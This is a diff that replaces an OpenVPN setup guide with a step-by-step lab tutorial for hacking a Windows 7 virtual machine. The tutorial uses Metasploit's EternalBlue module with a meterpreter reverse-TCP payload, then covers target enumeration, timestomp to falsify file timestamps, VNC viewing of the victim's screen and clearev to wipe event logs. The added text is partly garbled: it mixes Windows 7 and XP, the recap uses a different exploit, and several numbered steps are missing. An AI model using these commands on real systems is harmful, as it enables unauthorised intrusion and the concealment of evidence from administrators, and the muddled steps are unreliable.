@@ -1,263 +1,384 @@
-﻿********************************************************
+**********************************************
 Straightforward Training™
-Raspberry Pi OpenVPN Setup
+Hacking Windows 7 with EternalBlue
 Author: Saulo S. Ortiz
-Date: 20170417
-Update: 20180528
-********************************************************
+Date: 20191115
+Update: 20191117
+**********************************************
 
-Update and Install openvpn and easy-rsa
-  • sudo apt-get update
-  • sudo apt-get install openvpn easy-rsa
+DISCLAIMER
+1. These steps are for educational purposes only and for use at your own network laboratory. If you use these steps without
+consent from the network owner, you’re on your own.
 
-Copy template dir into home dir
-  • make-cadir ~/openvpn-ca
+2. I am not responsible for any issues/damages to hardware or software by using any of the software mentioned in this guide
+or damages by following the steps…do so at your own risk. I have tested these steps myself and found no issues/damage to my
+own systems. Also, I am not responsible for software links, software availability or versions differences.
 
-Go into dir
-  • cd ~/openvpn-ca
+3. You will need to have common Linux knowledge to be able to follow this guide as well as what an .iso file is; installing
+and configuring a Linux distro in a VM environment, general VM knowledge, and basic DOS commands. I will not be covering
+these steps in this short guide. This guide is NOT for people that have no idea how to install, remove, update/upgrade, and
+configure Linux/Windows O/S or VMs. Google is your best friend and research is part of the job.
 
-Configure CA Variables
-  • nano vars
-  • scroll to bottom
-  • change ID info (optional)
-  • Look for KEY_NAME
-    o enter KEY_NAME=“server”
-  • ctrl-x, y, enter
+COMMONS COMMANDS TO KNOW:
+• ls		     - Lists Files (LS)
+• pwd		     - Prints the current path to screen
+• cd		     - Call Directory
+• ifconfig	 - Displays local network information
+• shell      - Opens Windows CMD prompt
 
-Build certificate authority
-  • cd ~/openvpn-ca
-  • source vars
-  • clean environment
-    o ./clean-all
-  • build root CA
-    o /build-ca
-  • press enter all through prompts
+DEFAULT LOGINS:
+• Kali: root/toor
 
-Create server certificate, key pair and encryption files
-*If you chose a name other name “server” during configure CA above you will have to adjust some instructions below, the server.conf, .crt and .key files.
-  • ./build-key-server server
-    o accept the default values and DO NOT enter the challenge password
-    o enter “y” on the next two questions
+WHAT YOU’LL NEED FOR THIS EXERCISE:
+  • A computer with minimum: 8GB RAM, 6 Core CPU and a HDD of 500GB (16GB best)
+  • ISO file of Windows 7
+  • ISO file of the latest Kali release (BIG)
+  • OracleVirtualbox (free) or VMWare Workstation 12 or higher
 
-Generate Diffie-Hellman keys
-  • ./build-dh
+******************************************************************************
+NOTE: When using a VM make sure you change your resolution to the highest you can use without having any scroll bars on the
+sides or the bottom of the screen.
+******************************************************************************
 
-Generate HMAC signature to strengthen the server’s TLS integrity verification
-  • openvpn –-genkey –-secret keys/ta.key
+VM SETUP:
+1. Install the VM application you want, then install Kali and Windows XP as VMs.
+2. Give the VMs:
+  a. Windows = 1 CPU/2 Core, 2GB RAM, and 60GB of HDD space. (use more if you have 16GB or more of RAM)
+  b. Kali = 1 CPU/2 Cores, 2GB RAM and 40GB HDD space. (use more if you have 16GB or more of RAM)
+3. Maximize the GPU memory on both Kali (1GB) and XP (512MB).
+  a. Do not use 3D on any of them.
+4. Make sure both VMs networks are in NAT so they use the same network range. There is no need to be connected to the Internet
+for this to work.
 
-Generate client certificate and key pair
-*To produce credentials without a password:
-  • cd ~/openvpn-ca
-  • source vars
-  • ./build-key client1
-    o accept the default values and DO NOT enter the challenge password
-    o enter “y” on the next two questions
+WINDOWS 7 SETUP:
+1. Go to the target and on the Desktop create a folder named My Files.
+2. Open the folder and right click in it. From the menu select New > Text Document
+	a. Insert a blank text file
+	b. Copy that file and make 2 more copies
+	c. Rename them text2 and text3.txt
 
-*To produce password-protected credentials:
-  • cd ~/openvpn-ca
-  • source vars
-  • ./build-key-pass client1
-    o accept the default values and DO NOT enter the challenge password
-    o enter “y” on the next two questions
+First we need to turn OFF the Firewall…I know what you’re thinking, but it needs to happen. Then, we need to turn ON the Audit
+Logon Event that will recognize when someone else is in the system. This is off by default. This option and many more will be
+ON if an administrator is good at their job.
 
-Copy files to OpenVPN dir
-  • cd ~/openvpn-ca/keys
-  • sudo cp ca.crt ca.key server.crt server.key ta.key dh2048.pem /etc/openvpn
+The next thing we need to change is to allow users to connect remotely to this computer. And lastly we need to change the way
+the users log on to the system.
 
-Copy and unzip a sample config file into config dir
-  • gunzip –c /usr/share/doc/openvpn/examples/sample-config-files/server.conf.gz | sudo tee /etc/openvpn/server.conf
+To turn off the Firewall…
+  1. Click: Start > Control Panel > Firewall
+  2. Under the General tab select OFF then click OK
 
-Modify server conf file
-  • sudo nano /etc/openvpn/server.conf
-  • find tls-auth using ctrl+w
-    o remove “;”
-    o below add key-direction 0
-  • find cipher using ctrl-w
-    o remove “;” from cipher AES-128-CBC
-    o below add auth SHA256
-  • find user nobody using ctrl-w
-    o remove “;” from both user and group nobody
-  • Push DNS changes to redirect all traffic through VPN
-  • find push “redirect-gateway def1 bypass-dhcp”
-    o remove “;”
-  • below find dhcp-option and remove “;” from both lines
+To turn on the Audit Logon Event…
+  1. Click: Start > Control Panel > Administrative Tools > Local Security Policy
+  2. Click: Local Policies > Audit Policy
+  3. Select: Audit logon events and select both check boxes
+  4. Close and go to Event Viewer
+  5. Select: Security and live it open
 
-*This assist clients in reconfiguring their DNS settings to use the VPN tunnel as the default gateway
+Allow remote users…
+  1. Click: Start > Control Panel > System
+  2. Under the Remote tab check the Allow user to connect remotely to this computer checkbox, then click OK
 
-(optional) modify port and protocol
-*The default port is 1194 for UDP and 443 for TCP
-  • sudo nano /etc/openvpn/server.conf
-  • find proto using ctrl-w
-  • change port number
-  • change proto to tcp if using port 443
+Change user logon…
+  1. Click: Start > Control Panel > User Accounts
+  2. Click: Change the way users log on or off (if you haven't already)
+  3. Uncheck the Use the Welcome screen checkbox
 
-(optional) point to non-default credentials
-*If you selected a different name for the server other than the default during the ./build-key-server, modify the cert and key lines
-  • sudo /etc/openvpn/server.conf
-  • sudo mv cert server.crt cert yourname.crt
-  • sudo mv key server.key key yourname.key
+Now we’re set. Continue on to Kali VM.
 
-Allow IP forwarding
-  • sudo nano /etc/sysctl.conf
-  • find net.ipv4 using ctrl-w
-    o remove # from # net.ipv4.ip_forward=1
-  • ctrl-x, y, enter
-  • read the file and adjust the values for the session
-      o sudo sysctl –p
+ATTACK:
+1. Find your Kali IP address…
+  a. Type: ifconfig
+    i. Take notes
 
-Modify UFW firewall rules to masquerade connections
-*Your public interface is after “dev”
-    o ex. default via ###.#.#.# dev eth0…
-  • sudo apt-get install ufw –y
-  • find public network interface
-    o ip route | grep default
+2. Scan for live-hosts…
+  a. Type: nmap –sn <target_ip >/24
+    i. Annotate your findings like IPs and their services running if any
 
-Set the default policy for POSTROUTING in the NAT table and masquerades any traffic coming from the VPN
-  • sudo nano /etc/ufw/before.rules
-  • enter new line below # ufw-before-forward:
-    o # START OPENVPN RULES
-    o # NAT table rules
-    o *nat
-    o :POSTROUTING ACCEPT [0:0]
-    o # Allow traffic from OpenVPN client to eth0
-    o –A POSTROUTING –s 10.8.0.0/8 –o eth0 –j MASQUERADE
-    o COMMIT
-    o # END OPENVPN RULES
+3. Select your target and scan for open ports in stealth mode…
+  a. Type: nmap –sS –Pn <target_ip>
+    i. Notice the SMB port service is running…we’ll use it on our attack
 
-*Remember to replace eth0 in the –A POSTROUTING with the interface you found after “dev”
+******************************************************************************
+NOTE: Optional...you can scan for very detailed versions and o/s with:
+• nmap -sV -A <target_ip>
+******************************************************************************
 
-Allow UFW to forward packages by default
-  • sudo nano /etc/default/ufw
-  • find DEFAULT_FORWARD_POLICY using ctrl-w
-  • change “DROP” to “ACCEPT”
-    o DEFAULT_FORWARD_POLICY=”ACCEPT”
-  • ctrl-x, y, enter
+4. Open a new terminal and run metasploit…
+  a. Type: msfconsole
+  b. Type: use exploit/windows/smb/ms17_10_eternalblue
+    i. Have you used the TAB key to autocomplete a command?
+  c. Type: set
+    i. Look at your options…also use the show options if you cannot find the RHOST
+  d. Type: set RHOST <target_ip>
+    i. Type set again or show options to see the changes
+  e. Type set payload windows/x64/meterpreter/reverse_tcp
+  f. Type: run or exploit
 
-Change UFW ports
-  • sudo ufw enable
-  • sudo ufw allow 1194/udp
-  • sudo ufw allow OpenSSH
-  • sudo ufw disable
-  • sudo ufw enable
+5. Now wait for the process to finish...you should see the word WIN like so...
 
-Start OpenVPN
-*Configuration file is called server.conf unless named otherwise
-  • sudo systemctl start openvpn@server
-  • check status
-    o sudo systemctl status openvpn@server
-    o look for Active: active (running)…
-  • check OpenVPN tun0 interface is running
-    o ip addr show tun0
-  • enable service to auto start at bootup
-    o sudo systemctl enable openvpn@server
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
 
-Creating a client config dir structure
-  • mkdir –p ~/client-configs/files
-  • lock down permissions to inner dir
-    o chmod 700 ~/client-configs/files
-  • copy client example client config in dir
-    o cp /usr/share/doc/openvpn/examples/sample-config-files/client.conf ~/client-configs/base.conf
+meterpreter >
 
-Point the clients to the OpenVPN server address
-  • sudo nano ~/client-configs/base.conf
-  • find “remote” using ctrl-w
-    o remote server_IP_address 1194
-    o proto udp
-*If you changed the port you need to change it here
-  • find user and group and remove “;”
-  • find ca, cert and key and remove “#” from each line
-    o ca ca.crt
-    o cert client.crt
-    o key client.key
-  • mirror cipher and auth settings from server.conf file
-    o cipher AES-128-CBC
-    o auth SHA256
-  • add key-direction anywhere in the file
-    o key-direction 1
-  • add the following commented out lines for Linux clients only that ship with /etc/openvpn/update-resolv-conf file
-    o # script-security 2
-    o # up /etc/openvpn/update-resolv-conf
-    o # down /etc/openvpn/update-resolv-conf
-  • Ctrl-x, y, enter
+******************************************************************************
+NOTE: You’re in meterpreter, a command shell connecting you to your target.
+******************************************************************************
 
-Create a simple script to compile the base config with the cert, key and encryption files
-  • create and open config.sh
-    o cd ~/client-configs
-    o sudo nano ~/client-configs/make_config.sh
-  • copy and paste from below
-    o #!/bin/bash
-    o
-    o # First argument: Client identifier
-    o
-    o KEY_DIR=~/openvpn-ca/keys
-    o OUTPUT_DIR=~/client-configs/files
-    o BASE_CONFIG=~/client-configs/base.conf
-    o
-    o cat ${BASE_CONFIG} \
-    o <(echo -e '<ca>') \
-    o ${KEY_DIR}/ca.crt \
-    o <(echo -e '</ca>\n<cert>') \
-    o ${KEY_DIR}/${1}.crt \
-    o <(echo -e '</cert>\n<key>') \
-    o ${KEY_DIR}/${1}.key \
-    o <(echo -e '</key>\n<tls-auth>') \
-    o ${KEY_DIR}/ta.key \
-    o <(echo -e '</tls-auth>') \
-    o > ${OUTPUT_DIR}/${1}.ovpn
-  • ctrl-x, y, enter
-  • mark the file as executable
-    o sudo chmod 700 ~/client-configs/make_config.sh
+1. In meterpreter, find out where you’re at this time...
+  a. Type: pwd
 
-Generate a config file for credentials
-  • cd ~/client-configs
-  • ./make_config.sh client1
-  • Verify you have client1.ovpn file
+2. Find some information about the target...
+  a. Type: sysinfo
+    i. Take notes
 
-Transfer to client system
-  • use pscp, SFTP, filezilla or WinSCP
-*Needs OpenVPN install in Windows or Linux
-  • Windows:
-    o copy the file to c:\Program Files\OpenVPN\config
-  • Linux:
-    o pscp file from server to client
-    o run openvpn client1.ovpn
+3. Find out the user accounts and when they were last accessed...
+  a. Type: shell
+	 i. To go into the cmd prompt of Windows
+  b. Type: net help
+	 i. To view all commands available
+  c. Type: net user
+	 i. To view current logged-in account in the target system
+	 ii. Take notes
+  d. Type: net user <username>
+    i. Find the last time the use was logged-on
+  e. Type: exit
+	 i. You're back in meterpreter
 
-Edit .ovpn file
-*Uncomment lines in .ovpn file only if you found an update-resolv-conf file in client system
-  • ls /etc/openvpn
-    o output: update-resolv-conf
-  • sudo nano client1.ovpn
-  • uncomment:
-    o script-security 2
-    o up /etc/openvpn/update-resolv-conf
-    o down /etc/openvpn/update-resolv-conf
+******************************************************************************
+NOTE: If theres an error or nothing happens while in the shell then use CTRL+C to terminate
+and Y to exit back to meterpreter...then you can go back in to shell if you need to
+******************************************************************************
 
-Test VPN connection
-  • without VPN open go to www.dnsleaktest.com
-    o site will return the IP assigned by your ISP which is what you appear to the rest of the world
-    o check DNS using extended test and will tell you the DNS servers you’re are using
-  • connect OpenVPN and refresh the browser
-    o you should have a different IP address
-    o check DNS using extended test and will tell you the DNS servers you’re are using
+4. In meterpreter, go to the My Files folder...
+  a. Type: cd c:/user
+  b. Type: pwd to find out the user's account named
+  c. Type: the users account then continue to the Desktop and the Folder...
+	 i. Example: c:/user/%username%/Desktop/My Files
+	 ii. FYI...replace %username% with the actual account that is currently logged-in
 
-Revoking client certs
-  • cd ~/openvpn-ca
-  • source vars
-  • ./revoke-full client1
-    o error 23 is normal
-    o file crl.pem was generated in /keys
+5. If you're in the folder now...
+  a. Type: timestomp text1.txt -v
+	 i. Now you can see the MACE
+   ii. MACE = Modified, Accessed, Created, Entry Modified
 
-Transfer .pem file
-  • sudo cp ~/openvpn-ca/keys/crl.pem /etc/openvpn
-  • sudo nano /etc/openvpn/server.conf
-    o at the bottom add:
-    o crl-verify crl.pem
-  • ctrl-x, y, enter
+6. Change the time and date...
+  a. Type: timestomp text1.txt -m "06/06/2016 12:30:25"
 
-Restart OpenVPN
-  • sudo systemctl restart openvpn@server
+7. Check the date and time...
+  a. Type: timestomp text1.txt -v
+	 i. -a, -c, -e flags respectively
+	 ii. -z changes all at the same time
+	 iii. -f matches all values to another file, this way it looks more authentic
+	 iv. -b removes all values
+	 v. -r blanks out all values
 
-To revoke additional clients, follow this process:
-  • Generate a new certificate revocation list by sourcing the vars file in the ~/openvpn-ca directory and then calling the revoke-full script on the client name
-  • Copy the new certificate revocation list to the /etc/openvpn directory to overwrite the old list
-  • Restart the OpenVPN service.
+******************************************************************************
+NOTE: Several things here...
+a. You can use / in meterpreter and \ in shell for your paths in Windows
+b. You cannot change the entire MACE as this will give you away to the admins
+******************************************************************************
+
+
+
+
+
+# (hash tag/pound) in front of the first line to comment it out
+  d. Save it: Ctrl+S
+  e. Ctrl+X to exit
+
+18. Find the correct session ID for this attack…
+  a. Type: sessions
+  b. Type: sessions –i <#>
+    i. Replace the <#> with the correct number for the session
+
+******************************************************************************
+NOTE: You’re back in meterpreter!
+******************************************************************************
+
+19. Upload the file back to the target…
+  a. Type: upload hacked.txt
+
+20. Get a GUI of the target machine…
+  a. Type: run vnc
+    i.	Wait a few seconds for this to work…if it doesn’t then there might be something blocking the connection.
+
+******************************************************************************
+NOTE: With this VNC connection you can control the mouse; it’s just a viewing option so you can see what
+the user is actually doing.
+******************************************************************************
+
+21. Go into Events in Windows and look at all the logs
+
+22. STOP! Instead of clearing the logs now we will move on to make a new user to maintain persistence. But in case you
+were curious, the command to clear the logs is:
+  a. Type: clearev
+    i. This will erase all logs and can alert the admin that someone was in the system…
+
+******************************************************************************
+NOTE: Continue to the Maintain Persistence Guide
+******************************************************************************
+
+EXERCISE QUESTIONS:
+In Linux, folders and files are considered the same thing…files. Do some research and answer the following questions:
+
+1. What does the command (dir) in Windows do? What is the equivalent in Linux?
+
+2. What is a file or folder that begins with a period (.) in its name?
+
+3. What is the command used to you look for those files with a period in their name? Use it.
+
+4. What is the command used to delete a folder that contains files/is not empty?
+
+5. What is the command to create a “folder”?
+
+6. What is the command to rename a file?
+
+7. What is a VNC? What other program will you need for it to work?
+
+8. What is nano and VIM? One of them is easier than the other.
+
+9. Use a text editor to create a text file with some contents in it.
+
+10. What is the command to read a file’s contents without opening it in a text editor?
+
+11. What are the commands used to update and upgrade Linux with the latest fixes/patches?
+
+12. Can you combine both of the update/upgrade commands to work as a single command? How?
+
+13. What is the command to delete temporary files after an update/upgrade?
+
+14. What does BASH stand for and with what declaration does the script start?
+
+15. Write a small BASH script to update/upgrade you Linux machine.
+
+16. What is the command to use to make a BASH script executable?
+
+17. What is the command to tell a script to automatically continue without user input? Include it in your BASH script.
+
+18. UFW stands for Uncomplicated Firewall. Do you have UFW installed?
+
+19. What is the command to do a search for open source software available for Linux users?
+
+20. Using the installation command, install UFW on your Linux machine.
+
+21. What is the man-page?
+
+22. Using the man-page (or the help description that every program comes with) find out if UFW is running or not? If not then
+enable it.
+
+23. Using your ninja-like research abilities (Google), find out what ports are most common for hackers to attack and go
+disable them in UFW.
+
+24. Using nmap, search for open ports on your system and check if you successfully blocked any of the ports you blocked in
+UFW. Do you have open ports even after you closed them? Why is this?
+
+25. In a few words, describe the difference between the command nmap –Pn and nmap –sn.
+
+26. One of these command just pings to see if there are live-hosts, the other searches for live-hosts and ports running. Which
+one does what?
+
+27. Using the help flag or man-page, which nmap command will give you’re the O/S version and services running at the same time?
+What other commands give you similar information?
+
+28. What is banner grabbing? What commands can you use to do this?
+
+29. What other commands did we use in this guide to get target information?
+
+SHORT/REFRESHER VERSION
+ATTACK:
+1. Find your Kali IP address…
+  a. Type: ifconfig
+
+2. Scan for live-hosts…
+  a. Type: nmap –sn <target_ip >/24
+
+3. Select your target and scan for open ports in stealth mode…
+  a. Type: nmap –sS –Pn <target_ip>
+
+4. Open a new terminal and run metasploit…
+  a. Type: msfconsole
+  b. Type: use exploit/windows/smb/ms08_067_netapi
+  c. Type: set
+  d. Type: set RHOST <target_ip>
+  e. Type: run to start
+
+5. In meterpreter, find out where you’re at this time…
+  a. Type: pwd
+
+6. Find some information about the target…
+  a. Type: sysinfo
+
+7. Go to the root drive (C:\)…
+  a. Type: cd \\
+
+8. Verify you’re in c:\…
+  a. Type: pwd
+
+9. Find network information…
+  a. Type: ipconfig
+
+10. View the directory…
+  a. Type: ls
+
+11. Create a folder in the target…
+  a. Type: mkdir whoops
+
+12. Go to a shell…
+  a. Type: shell
+
+13. Rename the folder whoops…
+  a. Type: ren whoops gothacked
+
+14. Verify the name was changed…
+  a. Type: dir
+
+15. Go into that folder…
+  a. Type: cd gothacked
+
+16. Create a file with text in it…
+  a. Type: shell
+  b. Type:  echo “this computer was hacked by me!” > hacked.txt
+  c. Type: exit
+
+17. Verify the file is there…
+  a. Type: ls or dir
+  b. Type: cd gothacked
+  c. Type: cat hacked.txt
+
+18. Download the text file…
+  a. Type: download hacked.txt
+
+19. Background the session…
+  a. Type: background
+
+20. Verify the file is in YOUR computer…
+  a. Type: ls or dir
+
+21. Open a new terminal and edit the file…
+  a. Type: nano hacked.txt
+  b. In a new line type: don’t forget to smile!
+  c. Type: # (hash tag/pound) in front of the first line to comment it out
+  d. Save your changes: Ctrl+S
+  e. Ctrl+X to exit
+
+22. Find and select the correct session ID for this attack…
+  a. Type: sessions
+  b. Type: sessions –i <#>
+
+23. Upload the file back to the target…
+  a. Type: pwd
+  b. Type: upload hacked.txt
+
+24. Get a GUI of the target machine…
+  a. Type: run vnc
+
+25. Go into Events in Windows XP and look at all the logs
+
+26. STOP! Instead of clearing the logs now we will move on to make a new user to maintain persistence. But in case you were
+curious, the command to clear the logs is:
+  a. Type: clearev
+
+27. Continue to Step #2: Maintain Persistence
